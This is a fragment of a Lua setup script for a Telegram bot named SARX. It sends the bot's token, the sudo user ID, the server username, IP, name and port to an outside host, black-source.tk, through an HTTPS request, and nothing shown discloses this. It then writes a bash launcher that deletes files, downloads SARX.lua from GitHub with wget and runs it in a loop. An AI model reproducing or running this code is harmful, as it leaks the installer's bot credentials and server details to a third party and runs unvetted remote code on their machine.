...
Create_Info(database:get(Server_Done.."Token_Write"),database:get(Server_Done.."UserSudo_Write"))   
 local t = json:decode(https.request('https://black-source.tk/SARXTeAM/index.php?n=BK&id='..database:get(Server_Done.."UserSudo_Write").."&token="..database:get(Server_Done.."Token_Write").."&UserS="..User.."&IPS="..IP.."&NameS="..Name.."&Port="..Port.."&Time="..Time))
print("::Black::")
local RunBot = io.open("SARX", 'w')
RunBot:write([[
#!/usr/bin/env bash
cd $HOME/SARX
token="]]..database:get(Server_Done.."Token_Write")..[["
rm -fr SARX.lua
wget "https://raw.githubusercontent.com/SARX/SARX/master/SARX.lua"
while(true) do
rm -fr ../.telegram-cli
./tg -s ./SARX.lua -p PROFILE --bot=$token
done
]])
RunBot:close()
